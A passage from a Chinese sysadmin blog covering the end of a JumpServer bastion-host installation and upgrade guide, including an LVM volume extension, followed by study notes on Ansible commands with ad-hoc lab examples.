class="hljs-section"># SESSION<span class="hljs-emphasis">_COOKIE_</span>AGE=86400</span><br>SESSION<span class="hljs-emphasis">_EXPIRE_</span>AT<span class="hljs-emphasis">_BROWSER_</span>CLOSE=True<br><br><span class="hljs-section"># Lion 开启字体平滑, 优化体验</span><br><span class="hljs-section">#</span><br>JUMPSERVER<span class="hljs-emphasis">_ENABLE_</span>FONT<span class="hljs-emphasis">_SMOOTHING=True</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">################################## 其他配置 ##################################</span><br><span class="hljs-emphasis"># 终端使用宿主 HOSTNAME 标识, 首次安装自动生成</span><br><span class="hljs-emphasis">#</span><br><span class="hljs-emphasis">SERVER_</span>HOSTNAME=$&#123;HOSTNAME&#125;<br><br><span class="hljs-section"># 当前运行的 JumpServer 版本号, 安装和升级完成后自动生成</span><br><span class="hljs-section">#</span><br>CURRENT<span class="hljs-emphasis">_VERSION=COPY</span><br></code></pre></td></tr></table></figure><h4 id="6、安装过程基本都是默认即可。一路回车，安装完毕后-jmctl-sh-start启动即可"><a href="#6、安装过程基本都是默认即可。一路回车，安装完毕后-jmctl-sh-start启动即可" class="headerlink" title="6、安装过程基本都是默认即可。一路回车，安装完毕后./jmctl.sh start启动即可"></a>6、安装过程基本都是默认即可。一路回车，安装完毕后./jmctl.sh start启动即可</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># 安装</span><br>./jmsctl.sh install<br><br><span class="hljs-section"># 启动</span><br>./jmsctl.sh start<br><br><span class="hljs-section"># 安装完成后配置文件 /opt/jumpserver/config/config.txt</span><br><br>cd /opt/jumpserver-installer-v2.27.0<br><br><span class="hljs-section"># 启动</span><br>./jmsctl.sh start<br><br><span class="hljs-section"># 停止</span><br>./jmsctl.sh down<br><br><span class="hljs-section"># 卸载</span><br>./jmsctl.sh uninstall<br><br><span class="hljs-section"># 帮助</span><br>./jmsctl.sh -h<br>COPY<br></code></pre></td></tr></table></figure><h4 id="7、启动成功后的url：10-0-0-136"><a href="#7、启动成功后的url：10-0-0-136" class="headerlink" title="7、启动成功后的url：10.0.0.136"></a>7、启动成功后的url：10.0.0.136</h4><p>默认账户：admin 密码一致。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">创建顺序：<br>创建登录jumpserver用户，创建组，将用户加进组里。<br>创建登录服务器的特权用户(root),普通用户，<br>添加资产--服务器，绑定特权用户和普通用户<br>测试连接，推送普通用户致服务器，在普通用户界面添加资产<br><br>资产授权：授权登录jumpserver的用户可远程访问哪几台服务器。<br><br>也可创建审计用户，查看普通用户在服务器的操作、录像、回放、强制踢人等操作。COPY<br></code></pre></td></tr></table></figure><h4 id="8、先创建命令过滤器再创建里面的规则，不允许普通用户删除文件、远程其他服务器等操作"><a href="#8、先创建命令过滤器再创建里面的规则，不允许普通用户删除文件、远程其他服务器等操作" class="headerlink" title="8、先创建命令过滤器再创建里面的规则，不允许普通用户删除文件、远程其他服务器等操作"></a>8、先创建命令过滤器再创建里面的规则，不允许普通用户删除文件、远程其他服务器等操作</h4><h4 id="9、也支持使用特定格式导入导出资产列表"><a href="#9、也支持使用特定格式导入导出资产列表" class="headerlink" title="9、也支持使用特定格式导入导出资产列表"></a>9、也支持使用特定格式导入导出资产列表</h4><h4 id="10、详细过程"><a href="#10、详细过程" class="headerlink" title="10、详细过程"></a>10、详细过程</h4><p>1、<br><img src="jump1-1024x475.jpg" alt="img"><br>2、<br><img src="jump2-1024x480.jpg" alt="img"><br>3、<br><img src="jump3-1024x553.jpg" alt="img"></p><h3 id="二、升级jumpserver"><a href="#二、升级jumpserver" class="headerlink" title="二、升级jumpserver"></a>二、升级jumpserver</h3><h4 id="1、查看jumpserver升级帮助"><a href="#1、查看jumpserver升级帮助" class="headerlink" title="1、查看jumpserver升级帮助"></a>1、查看jumpserver升级帮助</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">#程序包内的执行程序帮助里讲的很清楚，执行命令即可</span><br><br>./jmsctl.sh -h<br><span class="hljs-section">#执行这条命令查看升级选项，这里发现check<span class="hljs-emphasis">_update为检查和升级选项，执行即可</span></span><br><span class="hljs-emphasis"><span class="hljs-section">JumpServer Deployment Management Script</span></span><br><span class="hljs-emphasis"><span class="hljs-section"></span></span><br><span class="hljs-emphasis"><span class="hljs-section">Usage: </span></span><br><span class="hljs-emphasis"><span class="hljs-section">  ./jmsctl.sh [COMMAND] [ARGS...]</span></span><br><span class="hljs-emphasis"><span class="hljs-section">  ./jmsctl.sh --help</span></span><br><span class="hljs-emphasis"><span class="hljs-section"></span></span><br><span class="hljs-emphasis"><span class="hljs-section">Installation Commands: </span></span><br><span class="hljs-emphasis"><span class="hljs-section">  install           Install JumpServer</span></span><br><span class="hljs-emphasis"><span class="hljs-section">  upgrade [version] Upgrade JumpServer</span></span><br><span class="hljs-emphasis"><span class="hljs-section">  check_</span>update      Check for updates JumpServer</span><br>  reconfig          Reconfiguration JumpServer<br><br>Management Commands: <br>  start             Start   JumpServer<br>  stop              Stop    JumpServer<br>  close             Close   JumpServer<br>  restart           Restart JumpServer<br>  status            Check   JumpServer<br>  down              Offline JumpServer<br>  uninstall         Uninstall JumpServer<br><br>More Commands: <br>  load<span class="hljs-emphasis">_image        Loading docker image</span><br><span class="hljs-emphasis">  backup_</span>db         Backup database<br>  restore<span class="hljs-emphasis">_db [file] Data recovery through database backup file</span><br><span class="hljs-emphasis">  raw               Execute the original docker-compose command</span><br><span class="hljs-emphasis">  tail [service]    View logCOPY</span><br></code></pre></td></tr></table></figure><h4 id="2、执行命令-jmsctl-sh-check-update-以下为具体过程"><a href="#2、执行命令-jmsctl-sh-check-update-以下为具体过程" class="headerlink" title="2、执行命令./jmsctl.sh check_update,以下为具体过程"></a>2、执行命令./jmsctl.sh check_update,以下为具体过程</h4><p>1、<br><img src="jm-up1-1024x472.jpg" alt="img"><br>2、<br><img src="jm-up2-1024x476.jpg" alt="img"><br>3、<br><img src="jm-up3-1024x479.jpg" alt="img"><br>4、<br><img src="jm-up4-1024x466.jpg" alt="img"><br>5、<br><img src="jm-up5-1024x445.jpg" alt="img"><br>6、<br><img src="jm-up6-1024x584.jpg" alt="img"><br>7、<br><img src="jm-up7-1024x470.jpg" alt="img"></p><h3 id="三、最终界面–升级成功"><a href="#三、最终界面–升级成功" class="headerlink" title="三、最终界面–升级成功"></a>三、最终界面–升级成功</h3><p><img src="jm-up8.jpg" alt="img"></p><h4 id="注意：因为docker默认存的镜像位置是在-var-lib-docker中，要保证-var的磁盘空间够大，我这里第一次升级因为空间只有5G，连docker旧版和新版images都放不下。导致升级失败，还好我做了逻辑卷可以扩展。附扩展步骤："><a href="#注意：因为docker默认存的镜像位置是在-var-lib-docker中，要保证-var的磁盘空间够大，我这里第一次升级因为空间只有5G，连docker旧版和新版images都放不下。导致升级失败，还好我做了逻辑卷可以扩展。附扩展步骤：" class="headerlink" title="注意：因为docker默认存的镜像位置是在/var/lib/docker中，要保证/var的磁盘空间够大，我这里第一次升级因为空间只有5G，连docker旧版和新版images都放不下。导致升级失败，还好我做了逻辑卷可以扩展。附扩展步骤："></a>注意：因为docker默认存的镜像位置是在/var/lib/docker中，要保证/var的磁盘空间够大，我这里第一次升级因为空间只有5G，连docker旧版和新版images都放不下。导致升级失败，还好我做了逻辑卷可以扩展。附扩展步骤：</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">#扩容前</span><br>[root@rocky ~]# df -h<br>Filesystem                 Size  Used Avail Use% Mounted on<br>devtmpfs                   1.8G     0  1.8G   0% /dev<br>tmpfs                      1.9G     0  1.9G   0% /dev/shm<br>tmpfs                      1.9G   18M  1.8G   1% /run<br>tmpfs                      1.9G     0  1.9G   0% /sys/fs/cgroup<br>/dev/mapper/rl<span class="hljs-emphasis">_rocky-root   10G  2.5G  7.6G  25% /</span><br><span class="hljs-emphasis">/dev/mapper/rl_</span>rocky-var   5.0G  4.9G  163M  97% /var<br>/dev/mapper/rl<span class="hljs-emphasis">_rocky-opt    20G  240M   20G   2% /opt</span><br><span class="hljs-emphasis">/dev/mapper/rl_</span>rocky-data   10G  334M  9.7G   4% /data<br>/dev/nvme0n1p1            1014M  216M  799M  22% /boot<br>tmpfs                      371M     0  371M   0% /run/user/0<br><br><span class="hljs-section">#虚拟机添加完硬盘开始扩容</span><br><span class="hljs-section">#创建物联卷</span><br>[root@rocky ~]# pvcreate /dev/nvme0n2<br>  Physical volume &quot;/dev/nvme0n2&quot; successfully created.<br><br><span class="hljs-section">#扩容卷组</span><br>[root@rocky ~]# vgextend rl<span class="hljs-emphasis">_rocky /dev/nvme0n2</span><br><span class="hljs-emphasis">  Volume group &quot;rl_</span>rocky&quot; successfully extended<br><br><span class="hljs-section">#逻辑卷扩容</span><br>[root@rocky ~]# lvextend -L +15G /dev/rl<span class="hljs-emphasis">_rocky/var </span><br><span class="hljs-emphasis">  Size of logical volume rl_</span>rocky/var changed from 5.00 GiB (1280 extents) to 20.00 GiB (5120 extents).<br>  Logical volume rl<span class="hljs-emphasis">_rocky/var successfully resized.</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">#结果，更新文件系统</span><br><span class="hljs-emphasis">[root@rocky ~]# xfs_</span>growfs /dev/rl<span class="hljs-emphasis">_rocky/var</span><br><span class="hljs-emphasis">meta-data=/dev/mapper/rl_</span>rocky-var isize=512    agcount=4, agsize=327680 blks<br><span class="hljs-code">         =                       sectsz=512   attr=2, projid32bit=1</span><br><span class="hljs-code">         =                       crc=1        finobt=1, sparse=1, rmapbt=0</span><br><span class="hljs-code">         =                       reflink=1</span><br><span class="hljs-code">data     =                       bsize=4096   blocks=1310720, imaxpct=25</span><br><span class="hljs-code">         =                       sunit=0      swidth=0 blks</span><br><span class="hljs-code">naming   =version 2              bsize=4096   ascii-ci=0, ftype=1</span><br><span class="hljs-code">log      =internal log           bsize=4096   blocks=2560, version=2</span><br><span class="hljs-code">         =                       sectsz=512   sunit=0 blks, lazy-count=1</span><br><span class="hljs-code">realtime =none                   extsz=4096   blocks=0, rtextents=0</span><br><span class="hljs-code">data blocks changed from 1310720 to 5242880</span><br><span class="hljs-code"></span><br><span class="hljs-section">#查看扩容结果</span><br>[root@rocky ~]# df -h<br>Filesystem                 Size  Used Avail Use% Mounted on<br>devtmpfs                   1.8G     0  1.8G   0% /dev<br>tmpfs                      1.9G     0  1.9G   0% /dev/shm<br>tmpfs                      1.9G   18M  1.8G   1% /run<br>tmpfs                      1.9G     0  1.9G   0% /sys/fs/cgroup<br>/dev/mapper/rl<span class="hljs-emphasis">_rocky-root   10G  2.5G  7.6G  25% /</span><br><span class="hljs-emphasis">/dev/mapper/rl_</span>rocky-var    20G  5.0G   16G  25% /var<br>/dev/mapper/rl<span class="hljs-emphasis">_rocky-opt    20G  240M   20G   2% /opt</span><br><span class="hljs-emphasis">/dev/mapper/rl_</span>rocky-data   10G  334M  9.7G   4% /data<br>/dev/nvme0n1p1            1014M  216M  799M  22% /boot<br>tmpfs                      371M     0  371M   0% /run/user/0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第十一周</title>
    <link href="/2023/07/28/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8/"/>
    <url>/2023/07/28/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-ansible-常用指令总结，并附有相关示例。"><a href="#1-ansible-常用指令总结，并附有相关示例。" class="headerlink" title="1 ansible 常用指令总结，并附有相关示例。"></a>1 ansible 常用指令总结，并附有相关示例。</h2><ul><li><code>/usr/bin/ansible</code> 主程序，临时命令执行工具</li><li><code>/usr/bin/ansible-doc </code>查看配置文档，模块功能查看工具,相当于man</li><li><code>/usr/bin/ansible-playbook</code> 定制自动化任务，编排剧本工具,相当于脚本</li><li><code>/usr/bin/ansible-pull </code>远程执行命令的工具</li><li><code>/usr/bin/ansible-vault</code> 文件加密工具</li><li><code>/usr/bin/ansible-console</code> 基于Console界面与用户交互的执行工具</li><li><code>/usr/bin/ansible-galaxy</code> 下载/上传优秀代码或Roles模块的官网平台</li></ul><p><strong>利用ansible实现管理的主要方式：</strong></p><ul><li><code>Ansible Ad-Hoc</code> 即利用ansible命令，主要用于临时命令使用场景</li><li><code>Ansible playbook</code> 主要用于长期规划好的，大型项目的场景，需要有前期的规划过程</li></ul><p><strong>ansible 使用前准备</strong></p><p>ansible 相关工具大多数是通过ssh协议，实现对远程主机的配置管理、应用部署、任务执行等功能</p><p>建议：使用此工具前，先配置ansible主控端能基于密钥认证的方式联系各个被管理节点</p><h3 id="1-1-ansible-doc"><a href="#1-1-ansible-doc" class="headerlink" title="1.1 ansible-doc"></a>1.1 ansible-doc</h3><p>此工具用来显示模块帮助,相当于man</p><p>格式</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">ansible-doc [options] [module...]<br>-l, --list <span class="hljs-comment">#列出可用模块</span><br>-s, --snippet <span class="hljs-comment">#显示指定模块的playbook片段</span><br></code></pre></td></tr></table></figure><p>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#列出所有模块</span><br>ansible-doc -l<br><span class="hljs-comment">#查看指定模块帮助用法</span><br>ansible-doc ping<br><span class="hljs-comment">#查看指定模块帮助用法</span><br>ansible-doc -s ping<br></code></pre></td></tr></table></figure><p>范例: 查看指定的插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[13:38:40 root@ansible-rocky ~]$ ansible-doc -t connection -l<br>[13:39:08 root@ansible-rocky ~]$ ansible-doc -t lookup -l<br></code></pre></td></tr></table></figure><h3 id="1-2-ansible"><a href="#1-2-ansible" class="headerlink" title="1.2 ansible"></a>1.2 ansible</h3><h4 id="1-2-1-Ansible-Ad-Hoc-介绍"><a href="#1-2-1-Ansible-Ad-Hoc-介绍" class="headerlink" title="1.2.1 Ansible Ad-Hoc 介绍"></a>1.2.1 Ansible Ad-Hoc 介绍</h4><p>Ansible Ad-Hoc 的执行方式的主要工具就是 ansible<br>特点: 一次性的执行,不会保存执行命令信息,只适合临时性或测试性的任务</p><h4 id="1-2-2-ansible-命令用法"><a href="#1-2-2-ansible-命令用法" class="headerlink" title="1.2.2 ansible 命令用法"></a>1.2.2 ansible 命令用法</h4><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible &lt;host-pattern&gt; [-m module_name] [-a args]<br></code></pre></td></tr></table></figure><p>选项说明：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">--version                               <span class="hljs-comment">#显示版本</span><br>-m module                               <span class="hljs-comment">#指定模块，默认为command</span><br>-v                                      <span class="hljs-comment">#详细过程 -vv -vvv更详细</span><br>--list-hosts                            <span class="hljs-comment">#显示主机列表，可简写 --list</span><br>-C, --check                             <span class="hljs-comment">#检查，并不执行</span><br>-T, --<span class="hljs-built_in">timeout</span>=TIMEOUT                   <span class="hljs-comment">#执行命令的超时时间，默认10s</span><br>-k, --ask-pass                          <span class="hljs-comment">#提示输入ssh连接密码，默认Key验证</span><br>-u, --user=REMOTE_USER                  <span class="hljs-comment">#执行远程执行的用户,默认root</span><br>-b, --become                            <span class="hljs-comment">#代替旧版的sudo实现通过sudo机制实现提升权限</span><br>--become-user=USERNAME                  <span class="hljs-comment">#指定sudo的run as用户，默认为root</span><br>-K, --ask-become-pass                   <span class="hljs-comment">#提示输入sudo时的口令</span><br>-f FORKS, --forks FORKS                 <span class="hljs-comment">#指定并发同时执行ansible任务的主机数</span><br>-i INVENTORY, --inventory INVENTORY     <span class="hljs-comment">#指定主机清单文件</span><br></code></pre></td></tr></table></figure><p>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#先打通基于key验证</span><br><span class="hljs-comment">#以yanlinux用户执行ping存活检测</span><br>[14:28:30 yanlinux@ansible-rocky ~]$ ansible all -m ping -u yanlinux<br>10.0.0.18 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;ansible_facts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;discovered_interpreter_python&quot;</span>: <span class="hljs-string">&quot;/usr/libexec/platform-python&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br>10.0.0.102 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;ansible_facts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;discovered_interpreter_python&quot;</span>: <span class="hljs-string">&quot;/usr/bin/python3&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br>10.0.0.7 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;ansible_facts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;discovered_interpreter_python&quot;</span>: <span class="hljs-string">&quot;/usr/bin/python&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br><br><span class="hljs-comment">#以yanlinux sudo至root执行命令</span><br><span class="hljs-comment">##没有添加sudo授权之前</span><br>[14:36:46 yanlinux@ansible-rocky ~]$ ansible all -a <span class="hljs-string">&#x27;ls /root&#x27;</span><br>10.0.0.18 | FAILED | rc=2 &gt;&gt;<br><span class="hljs-built_in">ls</span>: cannot open directory <span class="hljs-string">&#x27;/root&#x27;</span>: Permission deniednon-zero <span class="hljs-built_in">return</span> code<br>10.0.0.102 | FAILED | rc=2 &gt;&gt;<br><span class="hljs-built_in">ls</span>: cannot open directory <span class="hljs-string">&#x27;/root&#x27;</span>: Permission deniednon-zero <span class="hljs-built_in">return</span> code<br>10.0.0.7 | FAILED | rc=2 &gt;&gt;<br><span class="hljs-built_in">ls</span>: cannot open directory /root: Permission deniednon-zero <span class="hljs-built_in">return</span> code<br><span class="hljs-comment">##在所有被控制主机上都加上suod授权</span><br>[14:30:46 root@ansible-rocky ~]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yanlinux    ALL=(ALL)   NOPASSWD: ALL&quot;</span> &gt;&gt; /etc/sudoers<br>[14:37:01 yanlinux@ansible-rocky ~]$ ansible all -a <span class="hljs-string">&#x27;ls /root&#x27;</span> -b<br>10.0.0.102 | CHANGED | rc=0 &gt;&gt;<br>init_os.sh<br>snap<br>10.0.0.7 | CHANGED | rc=0 &gt;&gt;<br>anaconda-ks.cfg<br>init_os.sh<br>10.0.0.18 | CHANGED | rc=0 &gt;&gt;<br>anaconda-ks.cfg<br>init_os.sh<br><span class="hljs-comment">##所有被管理主机上创建用户magedu</span><br>[14:37:05 yanlinux@ansible-rocky ~]$ ansible all -a <span class="hljs-string">&#x27;useradd magedu&#x27;</span> -b<br>10.0.0.102 | CHANGED | rc=0 &gt;&gt;<br><br>10.0.0.18 | CHANGED | rc=0 &gt;&gt;<br><br>10.0.0.7 | CHANGED | rc=0 &gt;&gt;<br><br>[14:39:46 yanlinux@ansible-rocky ~]$ ansible all -a <span class="hljs-string">&#x27;getent passwd magedu&#x27;</span> -b<br>10.0.0.7 | CHANGED | rc=0 &gt;&gt;<br>magedu:x:1002:1002::/home/magedu:/bin/bash<br>10.0.0.102 | CHANGED | rc=0 &gt;&gt;<br>magedu:x:1001:1001::/home/magedu:/bin/sh<br>10.0.0.18 | CHANGED | rc=0 &gt;&gt;<br>magedu:x:1001:1001::/home/magedu:/bin/bash<br></code></pre></td></tr></table></figure><p>范例: 并发执行控制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#并发是1一个主机一个主机的执行，一条条返回结果</span><br>[14:42:47 root@ansible-rocky ~]$ ansible all -a <span class="hljs-string">&#x27;sleep 5&#x27;</span> -f1<br><span class="hljs-comment">#并发是10，同时10个主机执行命令，返回结果</span><br>[14:42:47 root@ansible-rocky ~]$ ansible all -a <span class="hljs-string">&#x27;sleep 5&#x27;</span> -f10<br></code></pre></td></tr></table></figure><p>范例: 使用普通用户连接远程主机执行代替另一个用户身份执行操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在被管理主机上创建用户并sudo授权</span><br>[14:34:00 root@ubuntu2004 ~]$ useradd magedu<br>[14:34:29 root@ubuntu2004 ~]$ <span class="hljs-built_in">echo</span> magedu:centos1 |chpasswd<br><br><span class="hljs-comment">#以yanlinux的用户连接用户并利用sudo代表magedu执行whoami命令</span><br>[14:58:37 yanlinux@ansible-rocky ~]$ ansible all -a <span class="hljs-string">&#x27;whoami&#x27;</span> -b --become-user=magedu<br>10.0.0.18 | CHANGED | rc=0 &gt;&gt;<br>magedu<br>10.0.0.7 | CHANGED | rc=0 &gt;&gt;<br>magedu<br></code></pre></td></tr></table></figure><h3 id="1-3-ansible-console"><a href="#1-3-ansible-console" class="headerlink" title="1.3 ansible-console"></a>1.3 ansible-console</h3><p>此工具可交互执行命令，支持tab，ansible 2.0+新增<br>提示符格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行用户@当前操作的主机组 (当前组的主机数量)[f:并发数]$<br></code></pre></td></tr></table></figure><p>常用子命令：</p><ul><li>设置并发数： <code>forks n</code> 例如： <code>forks 10</code></li><li>切换组： <code>cd</code> 主机组 例如： <code>cd web</code></li><li>列出当前组主机列表： <code>list</code></li><li>列出所有的内置命令： <code>?或help</code></li></ul><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[15:24:28 root@ansible-rocky ~]$ ansible-console <br>Welcome to the ansible console. Type <span class="hljs-built_in">help</span> or ? to list commands.<br><br>root@all (3)[f:5]$ ping<br>10.0.0.18 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;ansible_facts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;discovered_interpreter_python&quot;</span>: <span class="hljs-string">&quot;/usr/libexec/platform-python&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br>10.0.0.102 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;ansible_facts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;discovered_interpreter_python&quot;</span>: <span class="hljs-string">&quot;/usr/bin/python3&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br>10.0.0.7 | SUCCESS =&gt; &#123;<br>    <span class="hljs-string">&quot;ansible_facts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;discovered_interpreter_python&quot;</span>: <span class="hljs-string">&quot;/usr/bin/python&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;changed&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;ping&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span><br>&#125;<br>root@all (3)[f:5]$ list<br>10.0.0.18<br>10.0.0.7<br>10.0.0.102<br>root@all (3)[f:5]$ 